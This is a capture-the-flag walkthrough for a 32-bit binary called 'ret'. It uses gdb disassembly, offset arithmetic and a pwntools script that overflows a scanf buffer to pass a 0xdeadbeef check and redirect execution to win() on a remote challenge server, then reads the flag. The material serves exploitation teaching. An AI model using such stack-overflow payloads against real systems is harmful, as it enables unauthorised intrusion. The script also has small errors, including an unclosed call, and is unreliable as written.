This program does not give us source code, so we will have to reverse it by hand. From the other challenges we looked at, the handleconnection() function was essentially the main() function since these are being hosted on a server.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/ret$ gdb ./ret 
gdb-peda$ disass handle_connection
Dump of assembler code for function handle_connection:
   0x0804868b <+0>:	push   ebp
   0x0804868c <+1>:	mov    ebp,esp
   0x0804868e <+3>:	sub    esp,0x8
   0x08048691 <+6>:	call   0x8048644 <func>
   0x08048696 <+11>:	nop
   0x08048697 <+12>:	leave  
   0x08048698 <+13>:	ret    
End of assembler dump.
```

So looking at the assembly code for this, it looks like it just calls the func() function, then returns. Let's take a look at the func() function.

```
gdb-peda$ disas func
Dump of assembler code for function func:
   0x08048644 <+0>:	push   ebp
   0x08048645 <+1>:	mov    ebp,esp
   0x08048647 <+3>:	sub    esp,0x58
   0x0804864a <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x08048651 <+13>:	sub    esp,0x8
   0x08048654 <+16>:	lea    eax,[ebp-0x4c]
   0x08048657 <+19>:	push   eax
   0x08048658 <+20>:	push   0x8048782
   0x0804865d <+25>:	call   0x8048500 <__isoc99_scanf@plt>
   0x08048662 <+30>:	add    esp,0x10
   0x08048665 <+33>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
   0x0804866c <+40>:	je     0x8048688 <func+68>
   0x0804866e <+42>:	sub    esp,0xc
   0x08048671 <+45>:	push   0x8048785
   0x08048676 <+50>:	call   0x80484b0 <puts@plt>
   0x0804867b <+55>:	add    esp,0x10
   0x0804867e <+58>:	sub    esp,0xc
   0x08048681 <+61>:	push   0x0
   0x08048683 <+63>:	call   0x80484d0 <exit@plt>
   0x08048688 <+68>:	nop
   0x08048689 <+69>:	leave  
   0x0804868a <+70>:	ret    
End of assembler dump.
```

So this function appears to do a bit more than handle_connection(). From the looks of it, it establishes a variable at "epb-0xc" that we will call var1 and set it equal to the hex value 0x0.
Then it makes another variable located at "ebp-0x4c" that we will call var2. It then calls the scanf function and stores the input in var2 (we can tell that because it pushes var2 to the stack before it calls the scanf function).
Later on in the program it checks to see if var1 is equal to the hex value 0xdeadbeef. If it is equal, it jumps to func+68, where the function returns. if it doesn't, then the program just exits.
So looking at this, it appears that we will have to execute a buffer overflow attack using the scanf call to set var1 equal to "0xdeadbeef" so it will pass the if then check. But then what do we do? There is nothing in this function that seems like it would directly give us a flag. Let's see if there is a win function using gdb.

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/ret$ objdump -D ret | grep win
0804861b <win>:
```

And there is a win function. Since I knew what the function was called, I was able to just sort through all of the output using grep. But this win() function does look like a good place to return to, and since we pass the if then check we could hijack code execution flow by overflowing the return address with the win() function. But let's worry about passing the if then check first. The first step is to calculate the difference on the stack between var1 and var2.

Set a breakpoint for the if then (cmp) comman
```
gdb-peda$ b *func+33
Breakpoint 1 at 0x8048665
```

Now we run the program, and find the addresses.
```
gdb-peda$ r
Starting program: /Hackery/ctf/ucf/pwn/ret/ret 
00000000000000000000000000000000000000

Breakpoint 1, 0x08048665 in func ()
gdb-peda$ x $ebp-0x4c
0xffffceac:	'0' <repeats 38 times>
gdb-peda$ x $ebp-0xc
0xffffceec:	""
```

So we have everything we need to calculate the difference. We have the address of var1 (0xffffceec), and the address of var2 (0xffffceac).

```
0xffffceec - 0xffffceac = 64
```

So the difference is 64 bytes, which we can fill with 64 characters. Then we would just need to push the hex value 0xdeadbeef onto the stack in little endian so the program can read it properly. So the first overflow will look like this.

```
payload = "0"*64 + "\xef\xbe\xad\xde"
```

Now to calculate the distance to reach the return address, which is almost alway stored in the eip register for 32 bit elfs. To do this, you can just go back to your gdb session that should still be on the same breakpoint.

```
gdb-peda$ info frame
Stack level 0, frame at 0xffffcf00:
 eip = 0x8048665 in func; saved eip = 0x8048696
 called by frame at 0xffffcf10
 Arglist at 0xffffcef8, args: 
 Locals at 0xffffcef8, Previous frame's sp is 0xffffcf00
 Saved registers:
  ebp at 0xffffcef8, eip at 0xffffcefc
```

Now we have the address of the eip register, which is 0xffffcefc. Now we just need to subtract var1 (which is where we can start giving input) from that address to give us the distance.

```
0xffffcefc - 0xffffceac = 80
```

So the distance between our input and the eip register is 80 bytes. Keep in mind that we have to send all of this in the same scanf input, so the previous payload already takes up 68 bytest (64 bytes for the characters, plus 4 for 0xdeadbeef). So to reach 80, we only need to write 12 more bytes. After that we should be able to write directly to the eip register the address of the win() function in little endian, and that should hijack code excecution flow to execute the win() function. So here is the python exploit I made to do this.

```
#Import pwntools
from pwn import *

#Setup the remot connection
conn = remote("ctf.hackucf.org", 9003)

#Create the payload
payload = "0"*64 + "\xef\xbe\xad\xde" + "0"*12 + "\x1b\x86\x04\x08"

#Send the payload
conn.sendline(payload)

#Drop to an interactive prompt
conn.interactive(
```

And let's try the exploit...

```
guyinatuxedo@tux:/Hackery/ctf/ucf/pwn/ret$ python exploit.py 
[+] Opening connection to ctf.hackucf.org on port 9003: Done
[*] Switching to interactive mode
you Win!

$ ls
flag.txt
ret
$ cat flag.txt
flag{no_you_suck!:P}
```

And just like that, we pwned the elf. Also the reason why I knew to start typing in system commands, was a guess based upon the system call in win(), and previous ctf experience.

